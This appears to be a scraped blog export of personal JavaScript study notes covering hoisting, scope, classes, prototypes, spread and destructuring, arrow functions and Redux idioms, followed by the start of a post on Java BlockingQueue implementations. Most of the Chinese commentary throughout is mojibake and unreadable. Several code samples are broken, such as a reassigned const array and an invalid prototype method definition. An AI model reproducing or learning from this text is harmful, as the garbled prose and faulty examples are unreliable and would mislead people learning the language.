å¦‚æœæ²¡æœ‰èµ°åˆ°è¿™ä¸€è¡Œçš„è¯æ˜¯ä¸ä¼šè¢«æ‰§è¡Œçš„ // TypeError: functionOne is not a function functionOne(); //ä¸‹é¢è¿™ä¸ªå…¶å®è¿™ä¸ªå«åš&quot;Anonymous&quot; function Expression var functionOne = function() { console.log(&quot;Hello!&quot;); }; // å› ä¸ºhoistçš„åŸå› ï¼Œ functionTwoçš„å®šä¹‰ä¼šè¢«æŒªåˆ°æœ€ä¸Šé¢ // Outputs: &quot;Hello!&quot; functionTwo(); function functionTwo() { console.log(&quot;Hello!&quot;); } // hoistçš„å­˜åœ¨ä¹Ÿå°±æ„å‘³ç€ï¼Œ ä¸‹é¢è¿™æ®µï¼Œæ— è®ºtestæ˜¯trueè¿˜æ˜¯false ï¼Œå¤–éƒ¨éƒ½èƒ½å¤Ÿè°ƒç”¨åˆ°functionThreeï¼Œé™¤éæ˜¯use-strict if (test) { // Error or misbehavior function functionThree() { doSomething(); } } This is called a Function Expression: var getRectArea = function(width, height) { return width * height; }; console.log(&quot;Area of Rectangle: &quot; + getRectArea(3,4)); // This should return the following result in the console: // Area of Rectangle: 12 This is called a Function Declaration: var w = 5; var h = 6; function RectArea(width, height) { //declaring the function return area = width * height; } //note you do not need ; after } RectArea(w,h); //calling or executing the function console.log(&quot;Area of Rectangle: &quot; + area); // This should return the following result in the console: // Area of Rectangle: 30 letå’Œvarçš„ä¸€ä¸ªé‡è¦åŒºåˆ«å°±æ˜¯block scope{ var x = 2; } // x CAN be used here { let x = 2; } // x can NOT be used here var i = 5; for (var i = 0; i &lt; 10; i++) { // some statements } // Here i is 10 let i = 5; for (let i = 0; i &lt; 10; i++) { // some statements } // Here i is 5 ES6çš„classçš„å¯ä»¥è‡ªå®šä¹‰getå’Œsetæ–¹æ³•class Car { constructor(brand) { this.carname = brand; } get cnam() { return this.carname; } set cnam(x) { this.carname = x; } } mycar = new Car(&quot;Ford&quot;); mycar.cnam; mycar.cnam();//ä¸éœ€è¦è¿™æ ·å†™ å¦å¤–ï¼Œgetå’Œsetæ–¹æ³•ä¸èƒ½å–å’ŒfieldNameä¸€æ ·çš„ï¼Œä¾‹å¦‚è¿™é‡Œçš„carname()ï¼Œæ‰€ä»¥å¾ˆå¤šå¼€å‘è€…å–œæ¬¢è¿™ä¹ˆå¹²å˜é‡åå‰é¢åŠ ä¸ª_ï¼Œä¾‹å¦‚_carnameï¼Œè¿™æ ·getå’Œsetæ–¹æ³•å°±å¯ä»¥ç”¨å¯¹åº”çš„åå­—äº†ã€‚ class Car { constructor(brand) { this._carname = brand; } get carname() { return this._carname; } set carname(x) { this._carname = x; } } mycar = new Car(&quot;Ford&quot;); mycar.carname;//è¿™æ ·å°±å¯ä»¥äº† stringå’ŒString(â€œâ€)è¿˜æ˜¯æœ‰ç‚¹åŒºåˆ«çš„var x = &quot;John&quot;; var y = new String(&quot;John&quot;); (x === y) // is false because x is a string and y is an object. var x = new String(&quot;John&quot;); var y = new String(&quot;John&quot;); (x == y) // is false because you cannot compare objects. æ‰€ä»¥å°½é‡ä½¿ç”¨primitivesï¼Œä¸è¦ä½¿ç”¨Number, String,Booleanè¿™ç§object Use {} instead of new Object() Use &quot;&quot; instead of new String() Use 0 instead of new Number() Use false instead of new Boolean() Use [] instead of new Array() Use /()/ instead of new RegExp() Use function (){} instead of new Function() jsé‡Œé¢variableçš„ç±»å‹æ˜¯å¯ä»¥æ”¹å˜çš„var x = &quot;Hello&quot;; // typeof x is a string x = 5; // changes typeof x to a number es6é‡Œé¢å‡½æ•°çš„argumentå¯ä»¥å¸¦defaultå‚æ•°function (a=1, b=1) { /*function code*/ } ä¸è¦ç”¨evalï¼Œä¸å®‰å…¨ä½¿ç”¨ifçš„æ—¶å€™è¦æ³¨æ„var x = 0; if (x = 0) å› ä¸ºè¿™æ˜¯ä¸€ä¸ªassignment,è€ŒAn assignment always returns the value of the assignment.æ‰€ä»¥ç­‰åŒäºtrue switch caseç”¨çš„æ¯”è¾ƒæ˜¯===var x = 10; switch(x) { case 10: alert(&quot;Hello&quot;); } // ä¸ç”Ÿæ•ˆ var x = 10; switch(x) { case &quot;10&quot;: alert(&quot;Hello&quot;); } å’Œæ‰€æœ‰çš„è®¡ç®—æœºè¯­è¨€ä¸€æ ·éƒ½å­˜åœ¨æµ®ç‚¹æ•°ç²¾ç¡®åº¦é—®é¢˜var x = 0.1; var y = 0.2; var z = x + y // the result in z will not be 0.3 // 0.30000000000000004 //è¿™æ˜¯ä¸€ç§è§£å†³åŠæ³• var z = (x * 10 + y * 10) / 10; // z will be 0.3 variableçš„ç±»å‹å˜åŒ–æ˜¯è‡ªåŠ¨çš„ä¸‹é¢è¿™ä¸ªä¾‹å­å°±æ˜¯objectå˜æˆäº†array var person = []; person[&quot;firstName&quot;] = &quot;John&quot;; person[&quot;lastName&quot;] = &quot;Doe&quot;; person[&quot;age&quot;] = 46; var x = person.length; // person.length will return 0 var y = person[0]; // person[0] will return undefined Undefined is Not Null(å¦‚ä½•åˆ¤æ–­ä¸€ä¸ªobjectå­˜åœ¨)if (typeof myObj === &quot;undefined&quot;) // You can test if an object exists by testing if the type is undefined: // incorrect ! if (myObj === null) //But you cannot test if an object is null, because this will throw an error if the object is undefined: // To solve this problem, you must test if an object is not null, and not undefined. // incorrect ! if (myObj !== null &amp;&amp; typeof myObj !== &quot;undefined&quot;) // correctã€‚ è¦å…ˆåˆ¤æ–­undefinedå†åˆ¤æ–­null if (typeof myObj !== &quot;undefined&quot; &amp;&amp; myObj !== null) ä¸€ç§åœ¨htmlæ–‡ä»¶ä¸­æŠŠscript tagå†™åœ¨åº•éƒ¨æ¥åŠ å¿«loadçš„æ–¹å¼Putting your scripts at the bottom of the page body lets the browser load the page first. While a script is downloading, the browser will not start any other downloads. In addition all parsing and rendering activity might be blocked. The HTTP specification defines that browsers should not download more than two components in parallel. An alternative is to use defer=â€trueâ€ in the script tag. The defer attribute specifies that the script should be executed after the page has finished parsing, but it only works for external scripts. &lt;script&gt; window.onload = function() { var element = document.createElement(&quot;script&quot;); element.src = &quot;myScript.js&quot;; document.body.appendChild(element); }; &lt;/script&gt; bind, call, thisjavascript-call-apply-vs-bind jsä¸­çš„thisIn HTML event handlers, this refers to the HTML element that received the event: &lt;button onclick=&quot;this.style.display=&#39;none&#39;&quot;&gt; Click to Remove Me! &lt;/button&gt; ä½†æ˜¯ä½¿ç”¨applyå’Œcallä¹Ÿå¯ä»¥æ”¹å˜thisçš„è¯­ä¹‰ var person1 = { fullName: function() { return this.firstName + &quot; &quot; + this.lastName; } } var person2 = { firstName:&quot;John&quot;, lastName: &quot;Doe&quot;, } person1.fullName.call(person2); // Will return &quot;John Doe&quot; With call(), an object can use a method belonging to another object.someFunction.callå°±æ˜¯æŠŠåŸæœ¬å±äºä¸€ä¸ªobjectçš„æ–¹æ³•æ‹¿è¿‡æ¥å¥—ç”¨åœ¨å¦ä¸€ä¸ªobjectä¸Š With a regular function this represents the object that calls the function:With an arrow function this represents the owner of the function: js çš„functionçš„bindæ–¹æ³• ä¾‹å¦‚ç»™documentçš„ä¸€ä¸ªelementæ·»åŠ ç‚¹å‡»callbackçš„æ—¶å€™ï¼Œclickæ–¹æ³•æ‰§è¡Œæ—¶çš„thiså·²ç»ä¸æ˜¯æ‰€é¢„æƒ³çš„thisäº†ï¼Œå› æ­¤ï¼Œéœ€è¦bind(this)ï¼Œå½“ç„¶æœ‰äº†arrow functionä¹‹åï¼Œä¸éœ€è¦bindäº† Button.prototype.hookEvent(element) { // Use bind() to ensure &#39;this&#39; is the &#39;this&#39; inside click() element.addEventListener(&#39;click&#39;, this.click.bind(this)); }; //OR Button.prototype.hookEvent(element) { // Use a new variable for &#39;this&#39; since &#39;this&#39; inside the function // will not be the &#39;this&#39; inside hookEvent() var me = this; element.addEventListener(&#39;click&#39;, function() { me.click() }); } //OR Button.prototype.hookEvent(element) { // =&gt; functions do not change &#39;this&#39;, so you can use it directly element.addEventListener(&#39;click&#39;, () =&gt; this.click()); } letå’Œvarçš„åŒºåˆ«ä¹Ÿåœ¨è¿™é‡Œæœ‰ä½“ç° function buildList(list) { var result = []; for (var i = 0; i &lt; list.length; i++) { // æŠŠvaræ¢æˆletå°±ä¸ä¼šéƒ½å˜æˆ2äº† var item = &#39;item&#39; + i; result.push( function() {console.log(item + &#39; &#39; + list[i])} ); } return result; } function testList() { var fnlist = buildList([1,2,3]); // Using j only to help prevent confusion -- could use i. for (var j = 0; j &lt; fnlist.length; j++) { fnlist[j](); } } testList() //logs &quot;item2 undefined&quot; 3 times ProtoTypeprototypeçš„æ„æ€å¤§æ¦‚å°±æ˜¯åŠ¨æ€çš„ç»™ä¸€ä¸ªobjectæ·»åŠ instanceæ–¹æ³•æˆ–è€…fieldã€‚ä¸æ˜¯staticæ–¹æ³•åœ¨consoleé‡Œé¢ï¼Œæ¯ä¸€ä¸ªobjectéƒ½èƒ½çœ‹åˆ°ä¸€ä¸ª__proto__ fieldï¼Œæ‰€ä»¥å°±ç®—es6å‡ºç°äº†classï¼Œclass methodä¹Ÿä¸æ˜¯å®šä¹‰åœ¨classä¸Šçš„ï¼Œè€Œæ˜¯å®šä¹‰åœ¨__proto__å¯¹è±¡ä¸Šçš„JavaScript is a prototype-based language javaScriptä¸­classä¼¼ä¹æ˜¯syntax sugarï¼Œä½¿ç”¨getProtoTypeOfå¯ä»¥çœ‹å‡ºæ¥classçš„æ–¹æ³•æœ€ç»ˆéƒ½å®šä¹‰åˆ°äº†__proto__å¯¹è±¡ä¸Šäº†ã€‚Constructorä¹Ÿåªæ˜¯ä¸€ä¸ªå®šä¹‰åœ¨__proto__ä¸Šçš„function class Person { constructor(firstName, lastName) { this.firstName = firstName; this.lastName = lastName; } getFullName() { return this.firstName + &quot; &quot; + this.lastName; } } //There are two function declarations above: One for the constructor, which gets the name Person, and one for getFullName, which is a function assigned to Person.prototype. firstName: undefined lastName: undefined __proto__: constructor: class Person arguments: (...) caller: (...) length: 2 prototype: {constructor: Æ’, getFullName: Æ’} name: &quot;Person&quot; // åªæ˜¯ä¸€ä¸ªfunction __proto__: Æ’ () [[FunctionLocation]]: VM40:2 [[Scopes]]: Scopes[2] getFullName: Æ’ getFullName() arguments: (...) caller: (...) length: 0 name: &quot;getFullName&quot; __proto__: Æ’ () [[FunctionLocation]]: VM40:7 [[Scopes]]: Scopes[2] Object.prototypeè¿™äº›éƒ½æ˜¯ES5å°±æœ‰çš„ç‰¹æ€§prototypesObject.defineProperty() is a new Object method in ES5. It lets you define an object property and/or change a propertyâ€™s value and/or metadata. // Create an Object: var person = { firstName: &quot;John&quot;, lastName : &quot;Doe&quot;, language : &quot;NO&quot;, }; // Change a Property: Object.defineProperty(person, &quot;language&quot;, { value: &quot;EN&quot;, writable : true, enumerable : true, configurable : true }); // Enumerate Properties var txt = &quot;&quot;; for (var x in person) { txt += person[x] + &quot;&lt;br&gt;&quot;; } document.getElementById(&quot;demo&quot;).innerHTML = txt; // Adding or changing an object property Object.defineProperty(object, property, descriptor) // Adding or changing many object properties Object.defineProperties(object, descriptors) // Accessing Properties Object.getOwnPropertyDescriptor(object, property) // Returns all properties as an array Object.getOwnPropertyNames(object) // Returns enumerable properties as an array Object.keys(object) // Accessing the prototype Object.getPrototypeOf(object) // Prevents adding properties to an object Object.preventExtensions(object) // Returns true if properties can be added to an object Object.isExtensible(object) // Prevents changes of object properties (not values) Object.seal(object) // Returns true if object is sealed Object.isSealed(object) // Prevents any changes to an object Object.freeze(object) // Returns true if object is frozen Object.isFrozen(object) es6çš„spread syntaxSpread syntax Spread syntax allows an iterable such as an array expression or string to be expanded in places where zero or more arguments (for function calls) or elements (for array literals) are expected, or an object expression to be expanded in places where zero or more key-value pairs (for object literals) are expected. syntax // For function calls: myFunction(...iterableObj); //For array literals or strings: [...iterableObj, &#39;4&#39;, &#39;five&#39;, 6]; // For object literals (new in ECMAScript 2018): let objClone = { ...obj }; ä½†æ˜¯ä¸è¦è·Ÿdestructuring assignmentæ··æ·†äº†destructuring assignmentThe destructuring assignment syntax is a JavaScript expression that makes it possible to unpack values from arrays, or properties from objects, into distinct variables. let a, b, rest; [a, b] = [10, 20]; console.log(a); // expected output: 10 console.log(b); // expected output: 20 [a, b, ...rest] = [10, 20, 30, 40, 50]; console.log(rest); // expected output: Array [30,40,50] åƒæäº†kotlinçš„tripleæœ‰äº†spread operatorï¼Œarray.pushå¯ä»¥æ¢ä¸€ç§å†™æ³• const arr1 = [0, 1, 2]; const arr2 = [3, 4, 5]; // Append all items from arr2 onto arr1 arr1 = arr1.concat(arr2); const arr1 = [0, 1, 2]; const arr2 = [3, 4, 5]; arr1 = [...arr1, ...arr2]; // arr1 is now [0, 1, 2, 3, 4, 5] objectçš„shallow cloneä¹Ÿå˜äº† const obj1 = { foo: &#39;bar&#39;, x: 42 }; const obj2 = { foo: &#39;baz&#39;, y: 13 }; const clonedObj = { ...obj1 }; // Object { foo: &quot;bar&quot;, x: 42 } const mergedObj = { ...obj1, ...obj2 };// æ³¨æ„è¿™é‡Œfooè¢«è¦†ç›–äº† // Object { foo: &quot;baz&quot;, x: 42, y: 13 } ä¸€äº›ä»£ç è§„èŒƒ è¿™äº›åªæ˜¯ä¹ æƒ¯ï¼Œä¸€äº›æ¨èçš„è®¾ç½®ï¼Œä¸å¼ºæ±‚ã€‚å„ä¸ªè¯­è¨€ç¤¾åŒºéƒ½æœ‰è‡ªå·±çš„è§„èŒƒã€‚ Underscores: Many programmers prefer to use underscores (date_of_birth), especially in SQL databases. Underscores are often used in PHP documentation. PascalCase: PascalCase is often preferred by C programmers. camelCase: camelCase is used by JavaScript itself, by jQuery, and other JavaScript libraries. æŒ‘ä¸€ä¸ªreduxçš„reducerä»£ç æ¥çœ‹ es6æˆ–è€…æ›´é«˜çš„è¯­æ³•ï¼Œä¹ æƒ¯å°±å¥½ const todos = (state = [], action) =&gt; { // arrow function, å‚æ•°çš„é»˜è®¤å€¼ switch (action.type) { case &#39;ADD_TODO&#39;: return [ ...state, // spread å°±æ˜¯æŠŠä¸€ä¸ªiterable objectæ‹†æ•£ es 2018çš„ { id: action.id, text: action.text, completed: false } ] case &#39;TOGGLE_TODO&#39;: return state.map(todo =&gt; (todo.id === action.id) ? {...todo, completed: !todo.completed} // æ‹†å¼€ä¸€ä¸ªtodo objï¼Œè¿”å›ä¸€ä¸ªæ–°çš„obj,completedè¢«è¦†ç›–ï¼Ÿ : todo ) default: return state } } export default todos arrow functionçš„syntaxBasic syntax (param1, param2, â€¦, paramN) =&gt; { statements } (param1, param2, â€¦, paramN) =&gt; expression // equivalent to: =&gt; { return expression; } // Parentheses are optional when there&#39;s only one parameter name: (singleParam) =&gt; { statements } singleParam =&gt; { statements } // The parameter list for a function with no parameters should be written with a pair of parentheses. () =&gt; { statements } // Advanced syntax // Parenthesize the body of a function to return an object literal expression: params =&gt; ({foo: bar}) // Rest parameters and default parameters are supported (param1, param2, ...rest) =&gt; { statements } // å…¶ä»–è¯­è¨€å¸¸è§çš„var argsä¹Ÿæœ‰ (param1 = defaultValue1, param2, â€¦, paramN = defaultValueN) =&gt; { statements } // Destructuring within the parameter list is also supported var f = ([a, b] = [1, 2], {x: c} = {x: a + b}) =&gt; a + b + c; f(); // 6 å› ä¸ºåˆ°å¤„æ˜¯undefinedï¼Œæ‰€ä»¥å‡½æ•°çš„è°ƒç”¨æˆ–è€…ä¼ å‚ä¹Ÿæœ‰ä¸€äº›å¥‡æ€ªçš„è¯­æ³•çœ‹ä¸Šå»ç…§ç€shellçš„pipeå»ç†è§£å°±æ˜¯äº† obj.dispatch(someMethod(maybeUndefined || {})); method &amp;&amp; method() //ä¾‹å¦‚é€‰æ‹©æ€§çš„æ˜¾ç¤ºæŸä¸ªViewå¯ä»¥è¿™ä¹ˆå¹² &lt;View&gt; {show &amp;&amp; &lt;Warning style={styles.warning}&gt;è¿™ä¸€å—åªæœ‰åœ¨showçš„æ—¶å€™æ‰ä¼šæ˜¾ç¤º&lt;/Warning&gt;} &lt;/View&gt; å†™è¿‡reduxä»£ç ä¹‹åå°±ä¼šç¢°ä¸Šè¿ç»­å¤šä¸ªarrow functionä¾‹å¦‚reduxçš„æ–‡æ¡£ä¸Šå°±æœ‰è¿™ç§å¥‡æ€ªçš„å†™æ³• const logger = store =&gt; next =&gt; action =&gt; { console.log(&#39;dispatching&#39;, action) let result = next(action) console.log(&#39;next state&#39;, store.getState()) return result } const crashReporter = store =&gt; next =&gt; action =&gt; { try { return next(action) } catch (err) { console.error(&#39;Caught an exception!&#39;, err) Raven.captureException(err, { extra: { action, state: store.getState() } }) throw err } } [è¿™ä¸ªå«åšcurried function](https://stackoverflow.com/questions/32782922/what-do-multiple-arrow-functions-mean-in-javascriptï¼‰ç®€å•æ¥è®²ï¼Œä¸‹é¢è¿™ä¿©æ˜¯ä¸€æ ·çš„ const noOpMiddleware = store =&gt; next =&gt; action =&gt; { return next(action) } const noOpMiddleware = function(store) { return function(next) { return function(action) { return next(action) } } } è¿˜æœ‰method(xxx)(yyy)redux basic export default connect( mapStateToProps, mapDispatchToProps )(TodoList) å…¶å®æ˜¯connectè¿”å›äº†ä¸€ä¸ªå‡½æ•°ï¼ŒTodoListæ˜¯è¯¥å‡½æ•°çš„å‚æ•°ï¼Œä»…æ­¤è€Œå·²ã€‚å› ä¸ºå‡½æ•°é‡Œé¢è¿”å›å‡½æ•°æ˜¯å®Œå…¨å¯ä»¥çš„ æ€æ ·åœ¨ä¸€ä¸ªå‡½æ•°é‡Œæ£€æŸ¥optional Argumentsæ˜¯å¦ä¼ äº†jsçš„å‡½æ•°å‚æ•°ä¼¼ä¹æ²¡æœ‰ä¸€ä¸ªæ˜¯requiredçš„ã€‚å†…ç½®çš„å…³é”®è¯æœ‰ä¸€ä¸ªargumentsç®€å•ç²—æš´çš„æ–¹å¼æ˜¯ argument2 === â€œundefinedâ€ cool ğŸ‘ kids ä¼šç”¨ä¸¤æ ¹ç«–çº¿ï¼Œä»¥æ­¤æä¾›defaultå€¼ï¼Œåæ­£æ˜¯çŸ­è·¯çš„ Using the || operator has become standard practice - all the cool kids do it - but be careful: The default value will be triggered if the argument evaluates to false, which means it might actually be undefined, null, false, 0, &#39;&#39; (or anything else for which Boolean(...) returns false). Object.xxxObject æ˜¯standard built in objectå¸¸ç”¨çš„æ–¹æ³•å…¶å®å°±é‚£ä¹ˆå‡ ä¸ª 1. Object.create() 2. Object.keys() // å¸¸å¸¸ç”¨äºè¿­ä»£ä¸€ä¸ªObjectçš„æ‰€æœ‰keyï¼Œä¾‹å¦‚ï¼š // Iterate through the keys Object.keys(employees).forEach(key =&gt; { let value = employees[key]; console.log(`${key}: ${value}`); }); 3. Object.values() // Initialize an object const session = { id: 1, time: `26-July-2018`, device: &#39;mobile&#39;, browser: &#39;Chrome&#39; }; // Get all values of the object const values = Object.values(session); console.log(values); //Output //[1, &quot;26-July-2018&quot;, &quot;mobile&quot;, &quot;Chrome&quot;] 4. Object.entries() // Initialize an object const operatingSystem = { name: &#39;Ubuntu&#39;, version: 18.04, license: &#39;Open Source&#39; }; // Get the object key/value pairs const entries = Object.entries(operatingSystem); console.log(entries); // Output // [ // [&quot;name&quot;, &quot;Ubuntu&quot;] // [&quot;version&quot;, 18.04] // [&quot;license&quot;, &quot;Open Source&quot;] // ] 5.Object.Assign() // Initialize an object const name = { firstName: &#39;Philip&#39;, lastName: &#39;Fry&#39; }; // Initialize another object const details = { job: &#39;Delivery Boy&#39;, employer: &#39;Planet Express&#39; }; // Merge the objects const character = Object.assign(name, details); console.log(character); // Output // {firstName: &quot;Philip&quot;, lastName: &quot;Fry&quot;, job: &quot;Delivery Boy&quot;, employer: &quot;Planet Express&quot;} Assignä¹Ÿå¯ä»¥ç”¨spread operatoræ¥ä»£æ›¿ï¼š // Initialize an object const name = { firstName: &#39;Philip&#39;, lastName: &#39;Fry&#39; }; // Initialize another object const details = { job: &#39;Delivery Boy&#39;, employer: &#39;Planet Express&#39; }; // Merge the object with the spread operator const character = {...name, ...details} // åˆ‡è®°ï¼Œshallow copy!! console.log(character); // Output // {firstName: &quot;Philip&quot;, lastName: &quot;Fry&quot;, job: &quot;Delivery Boy&quot;, employer: &quot;Planet Express&quot;} è¿˜æœ‰ï¼Œä¾‹å¦‚Object.freezeï¼ˆæŠŠæ‰€æœ‰çš„fieldå˜æˆunmodifiableçš„ï¼‰ï¼ŒObject.sealç¦æ­¢å†ç»™è¿™ä¸ªobjectæ·»åŠ æ–°çš„field assignä¹Ÿå¯ä»¥æ›´æ”¹éƒ¨åˆ†å±æ€§ï¼Œä¾‹å¦‚reduxçš„reducerä¸­ç»å¸¸è¿™ä¹ˆå¹²const obj = { something: &#39;some value&#39;, other: &#39;the original value&#39; } // Object.assign copies properties from all the objects // onto the first object from left to right. const newObject = Object.assign({}, obj, { something: &#39;some other value&#39; }) Array.xxxjsçš„arrayçš„ä¸€äº›æ–¹æ³•ï¼Œéƒ½æ˜¯å¾ˆæ—©å°±æœ‰çš„js arrayä¾‹å¦‚map,reduceå’ŒreduceRightä¸ä¼šæ›´æ”¹åŸæœ‰çš„arrayã€‚ Array.prototypemap,filterè¿™äº›æ–¹æ³•è¿”å›çš„æ˜¯ä¸€ä¸ªæ–°çš„arrayå¯ä»¥ç†è§£ï¼Œä½†æ˜¯ä¸‹é¢è¿™äº›å¾ˆè¯¡å¼‚äº†concatè¿”å›çš„æ˜¯ä¸€ä¸ªnew Array,pushæ–¹æ³•è¿”å›çš„æ˜¯æ–°çš„length,ä¹Ÿå°±æ˜¯åŸæ¥çš„length+1 Array.prototype.concat //The concat() method is used to merge two or more arrays. This method does not change the existing arrays, but instead returns a new array. The Array.from() method creates a new, shallow-copied Array instance from an array-like or iterable object. The Array.map() method creates a new array populated with the results of calling a provided function on every element in the calling array. Array.isArray Array.pop //ç§»é™¤æœ€åä¸€ä¸ª Array.shift //ç§»é™¤ç¬¬ä¸€ä¸ª Array.unshift // insertAtFirst Array.push // add at tail splicesplice(index number, number of items to remove, items to add) //å¯ä»¥add ä¹Ÿå¯ä»¥removeï¼Œ ä¹Ÿå¯ä»¥åŒæ—¶add remove. // æ³¨æ„ç¬¬ä¸‰ä¸ªå‚æ•°æ˜¯optionalçš„ 1. add element let fish = [ &quot;piranha&quot;, &quot;barracuda&quot;, &quot;koi&quot;, &quot;eel&quot; ]; // Splice a new item number into index position 1 fish.splice(1, 0, &quot;manta ray&quot;); // fish; //Output // [ &#39;piranha&#39;, &#39;manta ray&#39;, &#39;barracuda&#39;, &#39;koi&#39;, &#39;eel&#39; ] 2. remove element let fish = [ &quot;piranha&quot;, &quot;barracuda&quot;, &quot;koi&quot;, &quot;eel&quot; ]; // Remove two items, starting at index position 1 fish.splice(1, 2); // fish; //Output // [ &#39;piranha&#39;, &#39;eel&#39; ] 3. add and remove let fish = [ &quot;piranha&quot;, &quot;barracuda&quot;, &quot;koi&quot;, &quot;eel&quot; ]; // Remove two items and add one fish.splice(1, 2, &quot;manta ray&quot;); // fish; // Output // [ &#39;piranha&#39;, &#39;manta ray&#39;, &#39;eel&#39; ] sliceå¯ä»¥è®¤ä¸ºæ˜¯æˆªå–arrayä¸­çš„ä¸€éƒ¨åˆ†å§ const animals = [&#39;ant&#39;, &#39;bison&#39;, &#39;camel&#39;, &#39;duck&#39;, &#39;elephant&#39;]; console.log(animals.slice(2)); // expected output: Array [&quot;camel&quot;, &quot;duck&quot;, &quot;elephant&quot;] console.log(animals.slice(2, 4)); // expected output: Array [&quot;camel&quot;, &quot;duck&quot;] console.log(animals.slice(1, 5)); // expected output: Array [&quot;bison&quot;, &quot;camel&quot;, &quot;duck&quot;, &quot;elephant&quot;] sort// Function to sort numbers by size const sortNumerically = (a, b) =&gt; { return a - b; } numbers.sort(sortNumerically); ForEachæ–¹æ³•çš„arrow Fuctionæœ€å¤šä¸‰ä¸ªå‚æ•°ï¼Œåä¿©æ˜¯optionalçš„fruits.forEach(function(item, index, array) { console.log(item, index) }) string.equalsæ–¹æ³•æœ‰æ²¡æœ‰å‘¢Comparison operators // true as both operands are type String (i.e. string primitives): &#39;foo&#39; === &#39;foo&#39; var a = new String(&#39;foo&#39;); var b = new String(&#39;foo&#39;); // false as a and b are type Object and reference different objects a == b // false as a and b are type Object and reference different objects a === b // true as a and &#39;foo&#39; are of different type and, the Object (a) // is converted to String &#39;foo&#39; before comparison a == &#39;foo&#39; æˆ–è€…ç”¨lodashçš„ _.isEqual(value, other)æ–¹æ³•ï¼Œè¿”å›true æˆ–è€…false å‚è€ƒYou-Dont-Know-JScomplete es6 featureshow-do-i-remove-a-property-from-a-javascript-objectjavascript clone ,shallow copyå¯ä»¥ä½¿ç”¨JSON.stringfyï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨lodashçš„deepcloneå‡½æ•°strict-mode In JavaScript, if you use the function keyword inside another function, you are creating a closure","tags":[{"name":"å‰ç«¯","slug":"å‰ç«¯","permalink":"https://haldir65.github.io/tags/å‰ç«¯/"}]},{"title":"jdké›†åˆç±»æºç åˆ†æ[queue]","date":"2019-09-15T10:30:47.000Z","path":"2019/09/15/2019-09-15-collections-Refuled-02/","text":"queueçš„ä¸€äº›å®ç°ç±»åŠä½¿ç”¨åœºæ™¯åˆ†æ Queueåœ¨çº¿ç¨‹æ± ä¸­çš„åº”ç”¨BlockingQueueæ˜¯ä¸€ä¸ªæ¥å£ï¼Œjdkä¸­å®ç°äº†è¯¥æ¥å£çš„classåŒ…æ‹¬ ArrayBlockingQueueLinkedBlockingQueueLinkedBlockingDequeLinkedTransferQueueSynchronousQueuePriorityBlockingQueueDelayQueue BlockingQueueæä¾›äº†å››ç§åº”å¯¹ç­–ç•¥æ¥å¤„ç†è¿™ç§èµ„æºä¸èƒ½è¢«ç«‹å³æ»¡è¶³çš„åœºæ™¯ ç©ºå€¼ æŠ›å‡ºå¼‚å¸¸ è¿”å›ä¸€ä¸ªç‰¹æ®Šå€¼ é˜»å¡ è°ƒç”¨è€…æä¾›ä¸€ä¸ªè¶…æ—¶ æ’å…¥ add(e) offer(e) put(e) put(e, time ,timeUnit) ç§»é™¤ remove() poll() take() poll(time,timeUnit) æ£€æŸ¥ element() peek() ä¸å¯ç”¨ ä¸å¯ç”¨ jdkçš„ThreadPoolExecutorçš„æ„é€ å‡½æ•°ä¸­éœ€è¦ä¼ å…¥ä¸€ä¸ªBlockingQueue workQueueï¼Œä¸€ä¸ªé˜»å¡å¼çš„é˜Ÿåˆ— ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œæ·»åŠ ä»»åŠ¡å’Œè·å–ä»»åŠ¡çš„è¿‡ç¨‹éƒ½æ˜¯é˜»å¡çš„ã€‚jdkä¸­æä¾›çš„çº¿ç¨‹æ± é€‰æ‹©çš„é˜Ÿåˆ—ï¼šnewCachedThreadPoolä½¿ç”¨äº†SynchronousQueue(æ¯ä¸€ä¸ªæ’å…¥æ“ä½œå¿…é¡»ç­‰å¾…å¦ä¸€ä¸ªçº¿ç¨‹çš„å¯¹åº”ç§»é™¤æ“ä½œ)newFixedThreadPoolä½¿ç”¨äº†LinkedBlockingQueue(è¿™ä¸ªé˜Ÿåˆ—æ˜¯æ— ç•Œçš„)ï¼Œå¹²æ´»çš„çº¿ç¨‹å°±é‚£ä¹ˆå¤šï¼Œä»»åŠ¡å¤šäº†å°±åŠ å…¥é˜Ÿåˆ—å¥½äº† queueçš„é‡è¦æ€§åœ¨äºï¼Œåœ¨çº¿ç¨‹æ± (ThreadPoolExecutor)ä¸­ï¼Œè·å–ä»»åŠ¡ä½¿ç”¨çš„æ˜¯queueçš„pollæ–¹æ³•ï¼Œæ·»åŠ ä»»åŠ¡ä½¿ç”¨çš„æ˜¯queueçš„offeræ–¹æ³•ã€‚ ArrayBlockingQueueçš„å®ç°ï¼šArrayBlockingQueueæ˜¯ä¸€ä¸ªç”±æ•°ç»„å®ç°çš„ æœ‰ç•Œé˜»å¡é˜Ÿåˆ—ã€‚è¯¥é˜Ÿåˆ—é‡‡ç”¨ FIFO çš„åŸåˆ™å¯¹å…ƒç´ è¿›è¡Œæ’åºæ·»åŠ ã€‚ ä¸»è¦çš„æˆå‘˜å˜é‡å°±è¿™ä¹ˆå‡ ä¸ª final Object[] items; /** items index for next take, poll, peek or remove */ int takeIndex; //ä¸‹ä¸€æ¬¡ä»é˜Ÿåˆ—ä¸­å–çš„index /** items index for next put, offer, or add */ int putIndex; // ä¸‹ä¸€æ¬¡å¾€é˜Ÿåˆ—ä¸­æ·»åŠ çš„index /** Number of elements in the queue */ int count; final ReentrantLock lock; //è¯»å†™æ“ä½œéƒ½è¦æ‹¿åˆ°è¿™ä¸ªé” /** Condition for waiting takes */ private final Condition notEmpty; /** Condition for waiting puts */ private final Condition notFull; å…¥åˆ—æ ¸å¿ƒæ–¹æ³•æ˜¯ä¸€ä¸ªprivateæ–¹æ³•enqueue(put ,offeréƒ½ä»£ç†ç»™äº†è¿™ä¸ªæ–¹æ³•)å‡ºåˆ—çš„æ ¸å¿ƒæ–¹æ³•æ˜¯dequeue(take, poll,peekå’Œremoveæ–¹æ³•éƒ½ä»£ç†ç»™äº†è¿™ä¸ªæ–¹æ³•) è¿™ä¸¤ä¸ªæ–¹æ³•çš„è°ƒç”¨æ˜¯è¢«åŒ…åœ¨ä¸€ä¸ªlock.lockå’Œlock.unlockä¸­çš„ï¼Œæ‰€ä»¥æ˜¯çº¿ç¨‹å®‰å…¨çš„çš„ã€‚ æ„é€ å‡½æ•°å¯ä»¥ä¼ ä¸€ä¸ªfairè¿›æ¥ã€‚enqueueæ–¹æ³•é‡Œé¢è¿˜æœ‰ä¸€ä¸ªnotEmpty.signal()ï¼Œ 